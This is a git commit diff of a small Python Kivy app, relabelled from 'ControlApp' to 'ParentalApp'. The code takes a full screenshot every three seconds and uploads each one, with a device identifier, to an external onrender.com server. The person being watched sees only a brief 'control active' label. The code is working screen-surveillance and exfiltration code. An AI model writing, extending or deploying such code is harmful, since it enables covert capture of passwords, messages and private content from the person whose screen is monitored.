b2ffed416c5e15b41b6f9b9b7ada8af45915d7fc
fgd-666 <fatimadaniel93@gmail.com>
2025-07-13 22:52:28 -0600

    main

--- server/main.py
+++ server/main.py
@@ -1,32 +1,31 @@
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.clock import Clock
+from plyer import screenshot
 import requests
 import uuid
 import os
-from PIL import ImageGrab  # capturas en Windows
 
+# CONFIGURACIÓN
 SERVER_URL = "https://dios-ybjy.onrender.com/upload-screenshot"
-DEVICE_ID = str(uuid.getnode())
+DEVICE_ID = str(uuid.getnode())  # ID único del dispositivo
 
-class ControlApp(App):
+class ParentalApp(App):
     def build(self):
-        Clock.schedule_interval(self.capture_and_upload, 3)
-        return Label(text="Control activo// Conexion establecida")
+        Clock.schedule_interval(self.capture_and_upload, 3)  # cada 3 segundos
+        return Label(text="Control activo/// Conexión exitosa")
 
     def capture_and_upload(self, dt):
-        filename = "screenshot.png"
+        filename = f"screenshot.png"
         try:
-            img = ImageGrab.grab()
-            img.save(filename)
-
+            screenshot.take(filename)
             with open(filename, 'rb') as f:
                 files = {'file': (filename, f, 'image/png')}
                 data = {'device_id': DEVICE_ID}
                 response = requests.post(SERVER_URL, data=data, files=files)
                 print("Subida:", response.status_code)
         except Exception as e:
-            print("Error al capturar o subir:", e)
+            print("Error al capturar/subir:", e)
 
 if __name__ == '__main__':
-    ControlApp().run()
+    ParentalApp().run()
